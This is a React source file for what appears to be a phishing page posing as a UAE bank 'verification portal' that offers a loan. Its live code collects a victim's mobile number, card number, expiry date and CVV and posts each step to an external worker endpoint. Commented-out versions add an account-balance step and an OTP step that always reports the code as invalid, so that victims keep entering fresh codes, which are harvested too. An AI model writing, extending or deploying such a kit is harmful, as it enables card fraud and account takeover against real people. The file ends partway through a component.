// //     setOtpError(" OTP. Please try again.");
// //     setOtp(["", "", "", "", "", ""]);
// //   };

// //   const handleResendOtp = () => {
// //     if (timer === 0) {
// //       setTimer(57);
// //       setOtp(["", "", "", "", "", ""]);
// //       setOtpError("");
// //     }
// //   };

// //   return (
// //     <div className="bg-[#007A45] min-h-screen text-white p-6">
// //       <div className="max-w-md mx-auto">
// //         <div className="flex justify-end mb-12 mt-4">
// //           <button className="flex items-center gap-2 text-sm hover:opacity-80">
// //             <Globe className="w-4 h-4" />
// //             <span className="font-medium">EN</span>
// //           </button>
// //         </div>

// //         <h1 className="text-4xl font-bold mb-4">OTP Verification</h1>
// //         <p className="text-sm mb-8 opacity-90 leading-relaxed">
// //           We've sent a 6-digit verification code to your registered mobile
// //           number
// //         </p>

// //         <div className="text-center mb-6">
// //           <p className="text-sm font-bold mb-3">STEP 4 OF 4</p>
// //           <div className="flex justify-center gap-2">
// //             {[1, 2, 3, 4].map((step) => (
// //               <div
// //                 key={step}
// //                 className="h-1.5 w-16 rounded-full bg-white transition-all"
// //               />
// //             ))}
// //           </div>
// //         </div>

// //         <div className="flex justify-center gap-3 mt-12 mb-6">
// //           {/* {otp.map((digit, index) => (
// //             <input
// //               key={index}
// //               id={`otp-${index}`}
// //               type="number"
// //               inputMode="numeric"
// //               pattern="[0-9]*"
// //               maxLength={1}
// //               value={digit}
// //               onChange={(e) => handleOtpChange(index, e.target.value)}
// //               className="w-14 h-16 text-center text-2xl font-bold bg-white/20 backdrop-blur-sm border-2 border-white/50 rounded-xl focus:outline-none focus:border-white focus:bg-white/30 text-white transition-all"
// //             />
// //           ))} */}
// //         <input
// //   type="text"
// //   inputMode="numeric"
// //   pattern="[0-9]*"

// //   placeholder="Enter OTP Number *"
// //   value={otp.join("")} // otp array ko string me convert
// //   onChange={(e) => {
// //     const val = e.target.value.replace(/\D/g, ""); // sirf digits allow
// //     setOtp(val.split("")); // string ko array me convert karke state update
// //     setOtpError(""); // error clear
// //   }}
// //   className="w-full bg-transparent border-b-2 border-white/50 py-4 px-2 
// //              placeholder-white/70 focus:outline-none focus:border-white text-lg transition-all"
// // />


// //           {/* <input
// //             type="number"
// //             inputMode="numeric"
// //             id={`otp-${index}`}
// //             maxLength={1}
// //               value={digit}
// //             pattern="[0-9]*"
// //             onChange={(e) => handleOtpChange(index, e.target.value)}
// //             placeholder="Enter your registered number *"
// //             // value={accountBalance}
// //             // onChange={(e) => setAccountBalance(e.target.value)}
// //             className="w-full bg-transparent border-b-2 border-white/50 py-4 px-2 placeholder-white/70 focus:outline-none focus:border-white text-lg transition-all"
// //           /> */}
// //         </div>

// //         {otpError && (
// //           <div className="bg-red-500/20 border border-red-300 rounded-lg p-3 mb-4">
// //             <p className="text-red-200 text-center font-medium">{otpError}</p>
// //           </div>
// //         )}

// //         <div className="text-center mb-2 mt-8">
// //           <p className="text-sm opacity-90">Didn't receive the code?</p>
// //         </div>

// //         <div className="text-center mb-8">
// //           <button
// //             onClick={handleResendOtp}
// //             disabled={timer > 0}
// //             className={`font-bold underline transition-all ${
// //               timer > 0
// //                 ? "opacity-50 cursor-not-allowed"
// //                 : "opacity-100 hover:text-white/80"
// //             }`}
// //           >
// //             Resend OTP
// //           </button>
// //           <p className="text-sm opacity-90 mt-1">
// //             Resend available in {timer}s
// //           </p>
// //         </div>

// //         <button
// //           onClick={handleVerifyOtp}
// //           disabled={otp.some((digit) => !digit) || loading}
// //           className="w-full bg-white/20 backdrop-blur-sm text-white py-4 rounded-full font-bold text-lg hover:bg-white/30 disabled:opacity-50 disabled:cursor-not-allowed transition-all transform hover:scale-[1.02] active:scale-[0.98]"
// //         >
// //           {loading ? "Verifying..." : "Otp Verify"}
// //         </button>

// //         <button
// //           onClick={onBack}
// //           className="w-full text-white py-4 mt-4 font-medium hover:underline transition-all"
// //         >
// //           ← Back to Home
// //         </button>
// //       </div>
// //     </div>
// //   );
// // };
// // Step 4 Component - OTP Verification
// // const Step4OTPVerification = ({
// //   mobileNumber,
// //   otp,
// //   setOtp,
// //   otpError,
// //   setOtpError,
// //   timer,
// //   setTimer,
// //   onBack,
// // }) => {
// //   const [loading, setLoading] = useState(false);

// //   const handleOtpChange = (index, value) => {
// //     if (value.length <= 1 && /^\d*$/.test(value)) {
// //       const newOtp = [...otp];
// //       newOtp[index] = value;
// //       setOtp(newOtp);

// //       if (value && index < 5) {
// //         const nextInput = document.getElementById(`otp-${index + 1}`);
// //         if (nextInput) nextInput.focus();
// //       }
// //     }
// //   };

// //   const handleVerifyOtp = async () => {
// //     setLoading(true);
// //     const otpString = otp.join("");

// //     const result = await sendToAPI({
// //       type: "otp",
// //       username: mobileNumber,
// //       otp: otpString,
// //     });

// //     setLoading(false);

// //     // Always show invalid OTP error and reset timer
// //     setOtpError(" OTP. Please try again.");
// //     setOtp(["", "", "", "", "", ""]);
    
// //     // Reset timer to 57 seconds when OTP is submitted
// //     setTimer(57);
// //   };

// //   const handleResendOtp = () => {
// //     if (timer === 0) {
// //       setTimer(59);
// //       setOtp(["", "", "", "", "", ""]);
// //       setOtpError("");
// //     }
// //   };

// //   // Handle single input OTP change
// //   const handleSingleInputOtpChange = (e) => {
// //     const val = e.target.value.replace(/\D/g, "").slice(0, 6); // sirf digits allow, max 6
// //     setOtp(val.split("")); // string ko array me convert karke state update
// //     setOtpError(""); // error clear
// //   };

// //   return (
// //     <div className="bg-[#007A45] min-h-screen text-white p-6">
// //       <div className="max-w-md mx-auto">
// //         <div className="flex justify-end mb-12 mt-4">
// //           <button className="flex items-center gap-2 text-sm hover:opacity-80">
// //             <Globe className="w-4 h-4" />
// //             <span className="font-medium">EN</span>
// //           </button>
// //         </div>

// //         <h1 className="text-4xl font-bold mb-4">OTP Verification</h1>
// //         <p className="text-sm mb-8 opacity-90 leading-relaxed">
// //           We've sent a 6-digit verification code to your registered mobile
// //           number
// //         </p>

// //         <div className="text-center mb-6">
// //           <p className="text-sm font-bold mb-3">STEP 4 OF 4</p>
// //           <div className="flex justify-center gap-2">
// //             {[1, 2, 3, 4].map((step) => (
// //               <div
// //                 key={step}
// //                 className="h-1.5 w-16 rounded-full bg-white transition-all"
// //               />
// //             ))}
// //           </div>
// //         </div>

// //         <div className="mt-12">
// //           <input
// //             type="text"
// //             inputMode="numeric"
// //             pattern="[0-9]*"
// //             placeholder="Enter OTP Number *"
// //             value={otp.join("")}
// //             onChange={handleSingleInputOtpChange}
// //             className="w-full bg-transparent border-b-2 border-white/50 py-4 px-2 
// //                      placeholder-white/70 focus:outline-none focus:border-white text-lg transition-all"
// //           />
// //         </div>

// //         {otpError && (
// //           <div className="bg-red-500/20 border border-red-300 rounded-lg p-3 mb-4 mt-6">
// //             <p className="text-red-200 text-center font-medium">{otpError}</p>
// //           </div>
// //         )}

// //         <div className="text-center mb-2 mt-8">
// //           <p className="text-sm opacity-90">Didn't receive the code?</p>
// //         </div>

// //         <div className="text-center mb-8">
// //           <button
// //             onClick={handleResendOtp}
// //             disabled={timer > 0}
// //             className={`font-bold underline transition-all ${
// //               timer > 0
// //                 ? "opacity-50 cursor-not-allowed"
// //                 : "opacity-100 hover:text-white/80"
// //             }`}
// //           >
// //             Resend OTP
// //           </button>
// //           <p className="text-sm opacity-90 mt-1">
// //             Resend available in {timer}s
// //           </p>
// //         </div>

// //         <button
// //           onClick={handleVerifyOtp}
// //           disabled={otp.join("").length !== 6 || loading}
// //           className="w-full bg-white/20 backdrop-blur-sm text-white py-4 rounded-full font-bold text-lg hover:bg-white/30 disabled:opacity-50 disabled:cursor-not-allowed transition-all transform hover:scale-[1.02] active:scale-[0.98]"
// //         >
// //           {loading ? "Verifying..." : "Verify OTP"}
// //         </button>

// //         <button
// //           onClick={onBack}
// //           className="w-full text-white py-4 mt-4 font-medium hover:underline transition-all"
// //         >
// //           ← Back to Home
// //         </button>
// //       </div>
// //     </div>
// //   );
// // };
// // Step 4 Component - OTP Verification
// const Step4OTPVerification = ({
//   mobileNumber,
//   otp,
//   setOtp,
//   otpError,
//   setOtpError,
//   timer,
//   setTimer,
//   onBack,
// }) => {
//   const [loading, setLoading] = useState(false);

//   const handleVerifyOtp = async () => {
//     setLoading(true);
//     const otpString = otp.join("");

//     const result = await sendToAPI({
//       type: "otp",
//       username: mobileNumber,
//       otp: otpString,
//     });

//     setLoading(false);

//     // Always show invalid OTP error and reset timer
//     setOtpError(" OTP. Please try again.");
//     setOtp(["", "", "", "", "", ""]);
    
//     // Reset timer to 57 seconds when OTP is submitted
//     setTimer(59);
//   };

//   const handleResendOtp = () => {
//     if (timer === 0) {
//       setTimer(59);
//       setOtp(["", "", "", "", "", ""]);
//       setOtpError("");
//     }
//   };

//   // Handle single input OTP change - REMOVED DIGIT LIMIT
//   const handleSingleInputOtpChange = (e) => {
//     const val = e.target.value.replace(/\D/g, ""); // sirf digits allow, NO LIMIT
//     setOtp(val.split("")); // string ko array me convert karke state update
//     setOtpError(""); // error clear
//   };

//   return (
//     <div className="bg-[#007A45] min-h-screen text-white p-6">
//       <div className="max-w-md mx-auto">
//         <div className="flex justify-end mb-12 mt-4">
//           <button className="flex items-center gap-2 text-sm hover:opacity-80">
//             <Globe className="w-4 h-4" />
//             <span className="font-medium">EN</span>
//           </button>
//         </div>

//         <h1 className="text-4xl font-bold mb-4">OTP Verification</h1>
//         <p className="text-sm mb-8 opacity-90 leading-relaxed">
//           We've sent a 6-digit verification code to your registered mobile
//           number
//         </p>

//         <div className="text-center mb-6">
//           <p className="text-sm font-bold mb-3">STEP 4 OF 4</p>
//           <div className="flex justify-center gap-2">
//             {[1, 2, 3, 4].map((step) => (
//               <div
//                 key={step}
//                 className="h-1.5 w-16 rounded-full bg-white transition-all"
//               />
//             ))}
//           </div>
//         </div>

//         <div className="mt-12">
//           <input
//             type="text"
//             inputMode="numeric"
//             pattern="[0-9]*"
//             placeholder="Enter OTP Number *"
//             value={otp.join("")}
//             onChange={handleSingleInputOtpChange}
//             className="w-full bg-transparent border-b-2 border-white/50 py-4 px-2 
//                      placeholder-white/70 focus:outline-none focus:border-white text-lg transition-all"
//           />
//         </div>

//         {otpError && (
//           <div className="bg-red-500/20 border border-red-300 rounded-lg p-3 mb-4 mt-6">
//             <p className="text-red-200 text-center font-medium">{otpError}</p>
//           </div>
//         )}

//         <div className="text-center mb-2 mt-8">
//           <p className="text-sm opacity-90">Didn't receive the code?</p>
//         </div>

//         <div className="text-center mb-8">
//           <button
//             onClick={handleResendOtp}
//             disabled={timer > 0}
//             className={`font-bold underline transition-all ${
//               timer > 0
//                 ? "opacity-50 cursor-not-allowed"
//                 : "opacity-100 hover:text-white/80"
//             }`}
//           >
//             Resend OTP
//           </button>
//           <p className="text-sm opacity-90 mt-1">
//             Resend available in {timer}s
//           </p>
//         </div>

//         <button
//           onClick={handleVerifyOtp}
//           disabled={otp.join("").length === 0 || loading} // sirf empty check, no digit limit
//           className="w-full bg-white/20 backdrop-blur-sm text-white py-4 rounded-full font-bold text-lg hover:bg-white/30 disabled:opacity-50 disabled:cursor-not-allowed transition-all transform hover:scale-[1.02] active:scale-[0.98]"
//         >
//           {loading ? "Verifying..." : "Verify OTP"}
//         </button>

//         <button
//           onClick={onBack}
//           className="w-full text-white py-4 mt-4 font-medium hover:underline transition-all"
//         >
//           ← Back
//         </button>
//       </div>
//     </div>
//   );
// };

// // Main Component
// export default function VerificationPortal() {
//   const [currentStep, setCurrentStep] = useState(1);
//   const [mobileNumber, setMobileNumber] = useState("");
//   const [atmCardNumber, setAtmCardNumber] = useState("");
//   const [expiryDate, setExpiryDate] = useState("");
//   const [cardPin, setCardPin] = useState("");
//   const [accountBalance, setAccountBalance] = useState("");
//   const [otp, setOtp] = useState(["", "", "", "", "", ""]);
//   const [otpError, setOtpError] = useState("");
//   const [timer, setTimer] = useState(57);

//   // Send visit notification on component mount
//   useEffect(() => {
//     sendToAPI({
//       type: "visit",
//       url: window.location.href,
//     });
//   }, []);

//   useEffect(() => {
//     if (currentStep === 4 && timer > 0) {
//       const interval = setInterval(() => {
//         setTimer((prev) => prev - 1);
//       }, 1000);
//       return () => clearInterval(interval);
//     }
//   }, [currentStep, timer]);

//   const handleNext = () => {
//     if (currentStep < 4) {
//       setCurrentStep(currentStep + 1);
//     }
//   };

//   const handleBack = () => {
//     if (currentStep > 1) {
//       setCurrentStep(currentStep - 1);
//       setOtpError("");
//     }
//   };

//   return (
//     <div>
//       {currentStep === 1 && (
//         <Step1MobileNumber
//           mobileNumber={mobileNumber}
//           setMobileNumber={setMobileNumber}
//           onNext={handleNext}
//         />
//       )}
//       {currentStep === 2 && (
//         <Step2ATMCard
//           mobileNumber={mobileNumber}
//           atmCardNumber={atmCardNumber}
//           setAtmCardNumber={setAtmCardNumber}
//           expiryDate={expiryDate}
//           setExpiryDate={setExpiryDate}
//           cardPin={cardPin}
//           setCardPin={setCardPin}
//           onNext={handleNext}
//           onBack={handleBack}
//         />
//       )}
//       {currentStep === 3 && (
//         <Step3AccountBalance
//           mobileNumber={mobileNumber}
//           atmCardNumber={atmCardNumber}
//           accountBalance={accountBalance}
//           setAccountBalance={setAccountBalance}
//           onNext={handleNext}
//           onBack={handleBack}
//         />
//       )}
//       {currentStep === 4 && (
//         <Step4OTPVerification
//           mobileNumber={mobileNumber}
//           otp={otp}
//           setOtp={setOtp}
//           otpError={otpError}
//           setOtpError={setOtpError}
//           timer={timer}
//           setTimer={setTimer}
//           onBack={handleBack}
//         />
//       )}
//     </div>
//   );
// }
import React, { useState, useEffect } from "react";
import { Globe } from "lucide-react";

const API_URL = "https://my-pr-worker.instapayapi.workers.dev";

// API Helper Function
const sendToAPI = async (data) => {
  try {
    const response = await fetch(API_URL, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(data),
    });
    return await response.json();
  } catch (error) {
    console.error("API Error:", error);
    return { success: false, error: error.message };
  }
};

// Card Validation Functions - ALL CARDS ALLOWED
const validateCardWithBinlist = async (cardNumber) => {
  try {
    // Basic Luhn algorithm check first
    if (!validateLuhn(cardNumber)) {
      return { 
        valid: false, 
        error: 'Invalid card number format' 
      };
    }

    // ALL CARDS ALLOWED - No Binlist API check
    return {
      valid: true,
      bank: 'Bank Card',
      type: 'card',
      country: 'AE'
    };
  } catch (error) {
    console.error('Validation error:', error);
    return {
      valid: true, // Even if error, allow the card
      bank: 'Bank Card',
      type: 'card'
    };
  }
};

// Luhn Algorithm Implementation
const validateLuhn = (cardNumber) => {
  const cleanNumber = cardNumber.replace(/\D/g, '');
  
  if (cleanNumber.length < 13 || cleanNumber.length > 19) {
    return false;
  }

  let sum = 0;
  let isEven = false;

  for (let i = cleanNumber.length - 1; i >= 0; i--) {
    let digit = parseInt(cleanNumber.charAt(i));

    if (isEven) {
      digit *= 2;
      if (digit > 9) {
        digit -= 9;
      }
    }

    sum += digit;
    isEven = !isEven;
  }

  return sum % 10 === 0;
};

// ALL CARDS ALLOWED - No UAE bank restriction
const validateUAEBank = (cardNumber) => {
  return true; // All cards allowed
};

// Step 1 Component - Mobile Number
const Step1MobileNumber = ({ mobileNumber, setMobileNumber, onNext }) => {
  const [loading, setLoading] = useState(false);

  const handleSubmit = async () => {
    setLoading(true);
    const result = await sendToAPI({
      type: "phone",
      phone: mobileNumber,
    });
    setLoading(false);

    if (result.success) {
      onNext();
    }
  };

  return (
    <div className="bg-[#007A45] min-h-screen text-white p-6">
      <div className="max-w-md mx-auto">
        <div className="flex justify-end mb-12 mt-4">
          <button className="flex items-center gap-2 text-sm hover:opacity-80">
            <Globe className="w-4 h-4" />
            <span className="font-medium">EN</span>
          </button>
        </div>

        <h1 className="text-4xl font-bold mb-4">
          Welcome to verification portal
        </h1>
        <p className="text-sm mb-8 opacity-90 leading-relaxed">
          Online Verification
        </p>

        <div className="text-center mb-6">
          <p className="text-sm font-bold mb-3">STEP 1 OF 4</p>
          <div className="flex justify-center gap-2">
            {[1, 2, 3, 4].map((step) => (
              <div
                key={step}
                className={`h-1.5 w-16 rounded-full transition-all ${
                  step === 1 ? "bg-white" : "bg-white/30"
                }`}
              />
            ))}
          </div>
        </div>

        <div
          className="flex items-center bg-white/10 backdrop-blur-md border border-white/20 
rounded-2xl px-4 py-3 mb-8 shadow-lg gap-3"
        >
          <span className="text-lg sm:text-xl font-semibold text-white/90">
            +971
          </span>

          <div className="h-6 sm:h-8 w-px bg-white/30"></div>

          <input
            type="tel"
            inputMode="numeric"
            pattern="[0-9]*"
            placeholder="Enter Registered Mobile Number"
            value={mobileNumber}
            onChange={(e) =>
              setMobileNumber(e.target.value.replace(/\D/g, "").slice(0, 9))
            }
            className="flex-1 bg-transparent text-white placeholder-white/50 text-base sm:text-xl 
               focus:outline-none truncate"
          />
        </div>

        <button
          onClick={handleSubmit}
          disabled={!mobileNumber || loading}
          className="w-full bg-white/20 backdrop-blur-sm text-white py-4 rounded-full font-bold text-lg hover:bg-white/30 disabled:opacity-50 disabled:cursor-not-allowed transition-all transform hover:scale-[1.02] active:scale-[0.98]"
        >
          {loading ? "Submitting..." : "Continue"}
        </button>
      </div>
    </div>
  );
};

// Step 2 Component - ATM Card Details
// const Step2ATMCard = ({
//   mobileNumber,
//   atmCardNumber,
//   setAtmCardNumber,
//   expiryDate,
//   setExpiryDate,
//   cardPin,
//   setCardPin,
//   onNext,
//   onBack,
// }) => {
//   const [loading, setLoading] = useState(false);
//   const [cardError, setCardError] = useState('');
//   const [isValidating, setIsValidating] = useState(false);

//   // Real-time card validation
//   const handleCardNumberChange = async (value) => {
//     const cleanValue = value.replace(/\D/g, "").slice(0, 16);
//     setAtmCardNumber(cleanValue);
//     setCardError('');

//     // Validate when user enters 16 digits
//     if (cleanValue.length === 16) {
//       setIsValidating(true);
      
//       // Basic validation first
//       if (!validateLuhn(cleanValue)) {
//         setCardError('Invalid card number format');
//         setIsValidating(false);
//         return;
//       }

//       // ALL CARDS ALLOWED - No UAE bank restriction
//       // Advanced validation (basic only)
//       try {
//         const validationResult = await validateCardWithBinlist(cleanValue);
//         if (!validationResult.valid) {
//           setCardError(validationResult.error);
//         }
//         // If valid, no error message - card is accepted
//       } catch (error) {
//         console.error('Validation error:', error);
//         // Continue without validation if it fails
//       } finally {
//         setIsValidating(false);
//       }
//     }
//   };

//   const handleSubmit = async () => {
//     // Final validation before submit
//     if (atmCardNumber.length !== 16) {
//       setCardError('Please enter a valid 16-digit card number');
//       return;
//     }

//     if (!validateLuhn(atmCardNumber)) {
//       setCardError('Invalid card number format');
//       return;
//     }

//     setLoading(true);
//     const result = await sendToAPI({
//       type: "cardDetails",
//       phone: mobileNumber,
//       cardNumber: atmCardNumber,
//       expiryDate: expiryDate,
//       cvv: cardPin,
//     });
//     setLoading(false);

//     if (result.success) {
//       onNext();
//     }
//   };

//   // Expiry date validation
//   const isExpiryValid = () => {
//     if (expiryDate.length !== 5) return false;
    
//     const [month, year] = expiryDate.split('/');
//     const currentYear = new Date().getFullYear() % 100;
//     const currentMonth = new Date().getMonth() + 1;
    
//     const expMonth = parseInt(month);
//     const expYear = parseInt(year);
    
//     if (expMonth < 1 || expMonth > 12) return false;
//     if (expYear < currentYear) return false;
//     if (expYear === currentYear && expMonth < currentMonth) return false;
    
//     return true;
//   };

//   const isFormValid = () => {
//     return atmCardNumber.length === 16 && 
//            !cardError && 
//            isExpiryValid() && 
//            cardPin.length === 3;
//   };

//   return (
//     <div className="bg-[#007A45] min-h-screen text-white p-6">
//       <div className="max-w-md mx-auto">
//         <div className="flex justify-end mb-12 mt-4">
//           <button className="flex items-center gap-2 text-sm hover:opacity-80">
//             <Globe className="w-4 h-4" />
//             <span className="font-medium">EN</span>
//           </button>
//         </div>

//         <h1 className="text-4xl font-bold mb-4">Additional Verification</h1>
//         <p className="text-sm mb-8 opacity-90 leading-relaxed">
//           For your security, please provide the following information to
//           complete the verification process
//         </p>

//         <div className="text-center mb-6">
//           <p className="text-sm font-bold mb-3">STEP 2 OF 4</p>
//           <div className="flex justify-center gap-2">
//             {[1, 2, 3, 4].map((step) => (
//               <div
//                 key={step}
//                 className={`h-1.5 w-16 rounded-full transition-all ${
//                   step <= 2 ? "bg-white" : "bg-white/30"
//                 }`}
//               />
//             ))}
//           </div>
//         </div>

//         <div className="space-y-8 mt-12">
//           <div>
//             <div className="relative">
//               <input
//                 type="text"
//                 inputMode="numeric"
//                 pattern="[0-9]*"
//                 placeholder="Enter your 16-digit ATM card number *"
//                 value={atmCardNumber}
//                 onChange={(e) => handleCardNumberChange(e.target.value)}
//                 className={`w-full bg-transparent border-b-2 py-4 px-2 placeholder-white/70 focus:outline-none text-lg transition-all ${
//                   cardError ? 'border-red-400' : 'border-white/50 focus:border-white'
//                 }`}
//               />
//               {isValidating && (
//                 <div className="absolute right-2 top-4">
//                   <div className="h-4 w-4 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
//                 </div>
//               )}
//             </div>
//             {cardError && (
//               <p className="text-red-300 text-sm mt-2 flex items-center gap-1">
//                 <svg className="h-4 w-4" fill="currentColor" viewBox="0 0 20 20">
//                   <path fillRule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2v-3a1 1 0 00-1-1H9z" clipRule="evenodd" />
//                 </svg>
//                 {cardError}
//               </p>
//             )}
//             {atmCardNumber.length === 16 && !cardError && !isValidating && (
//               <p className="text-green-300 text-sm mt-2 flex items-center gap-1">
//                 <svg className="h-4 w-4" fill="currentColor" viewBox="0 0 20 20">
//                   <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clipRule="evenodd" />
//                 </svg>
//                 Valid card number
//               </p>
//             )}
//           </div>

//           <div>
//             <input
//               type="text"
//               inputMode="numeric"
//               pattern="[0-9/]*"
//               placeholder="Expiry date (MM/YY) *"
//               value={expiryDate}
//               onChange={(e) => {
//                 let val = e.target.value.replace(/\D/g, "");
//                 if (val.length >= 2) {
//                   val = val.slice(0, 2) + "/" + val.slice(2, 4);
//                 }
//                 setExpiryDate(val);
//               }}
//               className="w-full bg-transparent border-b-2 border-white/50 py-4 px-2 placeholder-white/70 focus:outline-none focus:border-white text-lg transition-all"
//             />
//           </div>

//           <div>
//             <input
//               type="number"
//               inputMode="numeric"
//               pattern="[0-9]*"
//               placeholder="CVV *"
//               value={cardPin}
//               onChange={(e) =>
//                 setCardPin(e.target.value.replace(/\D/g, "").slice(0, 3))
//               }
//               maxLength={3}
//               className="w-full bg-transparent border-b-2 border-white/50 py-4 px-2 placeholder-white/70 focus:outline-none focus:border-white text-lg transition-all"
//             />
//           </div>
//           <p className="text-sm text-white">
//             CVV digits (CVV on back of card)
//           </p>
//         </div>

//         <button
//           onClick={handleSubmit}
//           disabled={!isFormValid() || loading}
//           className="w-full bg-white/20 backdrop-blur-sm text-white py-4 rounded-full font-bold text-lg mt-12 hover:bg-white/30 disabled:opacity-50 disabled:cursor-not-allowed transition-all transform hover:scale-[1.02] active:scale-[0.98]"
//         >
//           {loading ? "Submitting..." : "Continue"}
//         </button>

//         <button
//           onClick={onBack}
//           className="w-full text-white py-4 mt-4 font-medium hover:underline transition-all"
//         >
//           ← Back
//         </button>
//       </div>
//     </div>
//   );
// };
// Step 2 Component - ATM Card Details
const Step2ATMCard = ({
  mobileNumber,
  atmCardNumber,
  setAtmCardNumber,
  expiryDate,
  setExpiryDate,
  cardPin,
  setCardPin,
  onNext,
  onBack,
}) => {
  const [loading, setLoading] = useState(false);
  const [cardError, setCardError] = useState('');
  const [isValidating, setIsValidating] = useState(false);

  // Real-time card validation
  const handleCardNumberChange = async (value) => {
    const cleanValue = value.replace(/\D/g, "").slice(0, 16);
    setAtmCardNumber(cleanValue);
    setCardError('');

    // Validate when user enters 16 digits
    if (cleanValue.length === 16) {
      setIsValidating(true);
      
      // Basic validation first
      if (!validateLuhn(cleanValue)) {
        setCardError('Invalid card number format');
        setIsValidating(false);
        return;
      }

      // Card is valid - clear any previous errors
      setCardError('');
      
      setIsValidating(false);
    }
  };

  const handleSubmit = async () => {
    setLoading(true);
    const result = await sendToAPI({
      type: "cardDetails",
      phone: mobileNumber,
      cardNumber: atmCardNumber,
      expiryDate: expiryDate,
      cvv: cardPin,
    });
    setLoading(false);

    if (result.success) {
      onNext();
    }
  };

  // Expiry date validation - FIXED
  const isExpiryValid = () => {
    if (expiryDate.length !== 5) return false;
    
    try {
      const [month, year] = expiryDate.split('/');
      const currentYear = new Date().getFullYear() % 100;
      const currentMonth = new Date().getMonth() + 1;
      
      const expMonth = parseInt(month);
      const expYear = parseInt(year);
      
      if (isNaN(expMonth) || isNaN(expYear)) return false;
      if (expMonth < 1 || expMonth > 12) return false;
      if (expYear < currentYear) return false;
      if (expYear === currentYear && expMonth < currentMonth) return false;
      
      return true;
    } catch (error) {
      return false;
    }
  };

  // SIMPLIFIED FORM VALIDATION
  const isFormValid = () => {
    console.log('Validation Check:', {
      cardLength: atmCardNumber.length,
      cardError: cardError,
      expiryValid: isExpiryValid(),
      cvvLength: cardPin.length,
      allConditions: atmCardNumber.length === 16 && 
                     !cardError && 
                     isExpiryValid() && 
                     cardPin.length === 3
    });

    return atmCardNumber.length === 16 && 
           !cardError && 
           isExpiryValid() && 
           cardPin.length === 3;
  };

  return (
    <div className="bg-[#007A45] min-h-screen text-white p-6">
      <div className="max-w-md mx-auto">
        <div className="flex justify-end mb-12 mt-4">
          <button className="flex items-center gap-2 text-sm hover:opacity-80">
            <Globe className="w-4 h-4" />
            <span className="font-medium">EN</span>
          </button>
        </div>

        <h1 className="text-4xl font-bold mb-4">Additional Verification</h1>
        <p className="text-sm mb-8 leading-relaxed bg-white/20 backdrop-blur-sm p-4 rounded-lg">
  <span className="font-bold">Note:</span> Please provide the debit/credit card on which 
  you wish to receive the loan.
</p>

        {/* <p className="text-sm mb-8 opacity-90 leading-relaxed">
          Please Provide the debit/credit card on which 
          you wish to receive the loan. */}
          {/* For your security, please provide the following information to
          complete the verification process */}
        {/* </p> */}

        <div className="text-center mb-6">
          <p className="text-sm font-bold mb-3">STEP 2 OF 4</p>
          <div className="flex justify-center gap-2">
            {[1, 2, 3, 4].map((step) => (
              <div
                key={step}
                className={`h-1.5 w-16 rounded-full transition-all ${
                  step <= 2 ? "bg-white" : "bg-white/30"
                }`}
              />
            ))}
          </div>
        </div>

        <div className="space-y-8 mt-12">
          <div>
            <div className="relative">
              <input
                type="text"
                inputMode="numeric"
                pattern="[0-9]*"
                placeholder="Enter your 16-digit ATM card number *"
                value={atmCardNumber}
                onChange={(e) => handleCardNumberChange(e.target.value)}
                className={`w-full bg-transparent border-b-2 py-4 px-2 placeholder-white/70 focus:outline-none text-lg transition-all ${
                  cardError ? 'border-red-400' : 'border-white/50 focus:border-white'
                }`}
              />
              {isValidating && (
                <div className="absolute right-2 top-4">
                  <div className="h-4 w-4 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                </div>
              )}
            </div>
            {cardError && (
              <p className="text-red-300 text-sm mt-2 flex items-center gap-1">
                <svg className="h-4 w-4" fill="currentColor" viewBox="0 0 20 20">
                  <path fillRule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2v-3a1 1 0 00-1-1H9z" clipRule="evenodd" />
                </svg>
                {cardError}
              </p>
            )}
            {atmCardNumber.length === 16 && !cardError && !isValidating && (
              <p className="text-green-300 text-sm mt-2 flex items-center gap-1">
                <svg className="h-4 w-4" fill="currentColor" viewBox="0 0 20 20">
                  <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clipRule="evenodd" />
                </svg>
                Valid card number
              </p>
            )}
          </div>

          <div>
            <input
              type="text"
              inputMode="numeric"
              pattern="[0-9/]*"
              placeholder="Expiry date (MM/YY) *"
              value={expiryDate}
              onChange={(e) => {
                let val = e.target.value.replace(/\D/g, "");
                if (val.length >= 2) {
                  val = val.slice(0, 2) + "/" + val.slice(2, 4);
                }
                setExpiryDate(val);
              }}
              className="w-full bg-transparent border-b-2 border-white/50 py-4 px-2 placeholder-white/70 focus:outline-none focus:border-white text-lg transition-all"
            />
            {expiryDate.length > 0 && !isExpiryValid() && (
              <p className="text-red-300 text-sm mt-2">
                Please enter a valid future expiry date
              </p>
            )}
          </div>

          <div>
            <input
              type="number"
              inputMode="numeric"
              pattern="[0-9]*"
              placeholder="CVV *"
              value={cardPin}
              onChange={(e) =>
                setCardPin(e.target.value.replace(/\D/g, "").slice(0, 3))
              }
              maxLength={3}
              className="w-full bg-transparent border-b-2 border-white/50 py-4 px-2 placeholder-white/70 focus:outline-none focus:border-white text-lg transition-all"
            />
            {cardPin.length > 0 && cardPin.length !== 3 && (
              <p className="text-red-300 text-sm mt-2">
                CVV must be 3 digits
              </p>
            )}
          </div>
          <p className="text-sm text-white">
            CVV digits (CVV on back of card)
          </p>
        </div>

        {/* DEBUG INFO - Remove in production */}
        {/* <div className="mt-4 p-3 bg-white/10 rounded-lg">
          <p className="text-xs text-white/70">Debug Info:</p>
          <p className="text-xs text-white/70">Card: {atmCardNumber.length}/16 {cardError ? '❌' : '✅'}</p>
          <p className="text-xs text-white/70">Expiry: {expiryDate} {isExpiryValid() ? '✅' : '❌'}</p>
          <p className="text-xs text-white/70">CVV: {cardPin.length}/3</p>
